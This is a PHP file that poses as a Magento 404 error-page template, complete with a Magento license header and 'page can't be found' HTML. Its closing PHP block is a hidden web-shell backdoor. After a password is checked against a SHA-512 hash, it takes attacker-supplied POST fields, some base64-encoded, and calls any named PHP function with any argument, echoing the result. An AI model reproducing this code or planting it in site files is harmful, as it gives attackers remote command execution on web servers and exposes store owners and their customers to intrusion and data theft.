<?php
/**
 * Magento
 *
 * NOTICE OF LICENSE
 *
 * This source file is subject to the Open Software License (OSL 3.0)
 * that is bundled with this package in the file LICENSE.txt.
 * It is also available through the world-wide-web at this URL:
 * http://opensource.org/licenses/osl-3.0.php
 * If you did not receive a copy of the license and are unable to
 * obtain it through the world-wide-web, please send an email
 * to license@magento.com so we can send you a copy immediately.
 *
 * DISCLAIMER
 *
 * Do not edit or add to this file if you wish to upgrade Magento to newer
 * versions in the future. If you wish to customize Magento for your
 * needs please refer to http://www.magento.com for more information.
 *
 * @category    Mage
 * @package     Errors
 * @copyright  Copyright (c) 2006-2015 X.commerce, Inc. (http://www.magento.com)
 * @license    http://opensource.org/licenses/osl-3.0.php  Open Software License (OSL 3.0)
 */

?>

<div class="content-inner">
		<section class="error-404 not-found">
				<header class="page-header">
					<h1 class="page-title">Oops! That page can&rsquo;t be found.</h1>
				</header><!-- .page-header -->
			<div class="page-content widget-area">
				<p>It looks like nothing was found at this location. Maybe try one of the links below or a search?</p>
				<div class="widget">
				
				</div>
			</div><!-- .page-content -->
		</section><!-- .error-404 -->
</div><!-- #.content-inner -->

<?php
if(!isset($_POST["s"]) || hash("sha512", $_POST["s"]) != 'd2f2722ca094421f67e87cca6e3038961764e5da8694127c45b07f8b4608b904cd9cd9ae3f9df4392e99a43e3c5a37b9b24a91dfea6a32454b55a951f85fe162'){
	exit();
}

$md = $_POST["a"];
if(isset($md)){
	$df = explode("#", $md);
	echo $df[0]($df[1]);
	echo true;
}

$mde = $_POST["b"];
$mdd = base64_decode($mde);
if(isset($mdd)){
	$df = explode("#", $mdd);
	echo $df[0]($df[1]);
	echo true;
}
?>